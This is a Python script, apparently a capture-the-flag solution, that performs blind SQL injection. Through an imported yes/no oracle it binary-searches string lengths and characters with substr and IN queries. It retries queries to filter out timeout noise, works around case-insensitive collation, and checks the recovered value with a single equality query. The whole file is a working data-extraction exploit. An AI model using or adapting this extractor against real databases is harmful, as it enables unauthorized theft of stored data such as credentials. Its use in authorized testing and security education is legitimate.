"""Final blind extractor with noise control, plus a one-query whole-string verification.

Every bit is asked up to `tries` times because a server-side timeout answers
'no signal' for a query that is actually true; a true answer is never noise.
Measured under load: ~20% spurious False, 0% spurious True.

String comparison here is CASE-INSENSITIVE (a CI collation): (SELECT 'hello')='HELLO'
is true. Candidate sets must therefore hold one representative per case class, so
FULLSET (32..126) is unusable -- it lists 'e' and 'E' apart and the search lands on an
arbitrary class member. LOWER and FLAGSET are case-free.
"""
import sys
import time
from oracle import ask

GAP = 2.0
FLAGSET = list("abcdefghijklmnopqrstuvwxyz0123456789_{}-.")
FULLSET = [chr(c) for c in range(32, 127)]
Q = {"n": 0}


def bit(expr, tries=3):
    for _ in range(tries):
        Q["n"] += 1
        if ask(expr):
            return True
        time.sleep(1.5)
    return False


def lit(c):
    return "'" + c.replace("'", "''") + "'"


def get_int(expr, lo=0, hi=100):
    while lo < hi:
        mid = (lo + hi + 1) // 2
        time.sleep(GAP)
        if bit("(%s)>=%d" % (expr, mid)):
            lo = mid
        else:
            hi = mid - 1
    return lo


def one_char(expr, i, cands):
    cands = list(cands)
    while len(cands) > 1:
        half = cands[:len(cands) // 2]
        time.sleep(GAP)
        if bit("(SELECT substr((%s),%d,1)) IN (%s)" % (expr, i, ",".join(lit(c) for c in half))):
            cands = half
        else:
            cands = cands[len(half):]
    return cands[0]


def get_str(expr, n=None, cands=FLAGSET, echo=sys.stderr):
    if n is None:
        n = get_int("length((%s))" % expr, 0, 120)
    out = []
    for i in range(1, n + 1):
        out.append(one_char(expr, i, cands))
        echo.write("\r  [%d/%d] %s" % (i, n, "".join(out)))
        echo.flush()
        time.sleep(GAP)
    echo.write("\n")
    return "".join(out)


if __name__ == "__main__":
    expr = sys.argv[1]
    t0 = time.time()
    val = get_str(expr)
    print("[*] extracted: %r" % val)
    ok = bit("(SELECT (%s)) = '%s'" % (expr, val.replace("'", "''")))
    print("[+] verified by a single equality query: %s" % ok)
    print("[*] %d queries, %.0fs" % (Q["n"], time.time() - t0))
    sys.exit(0 if ok else 1)
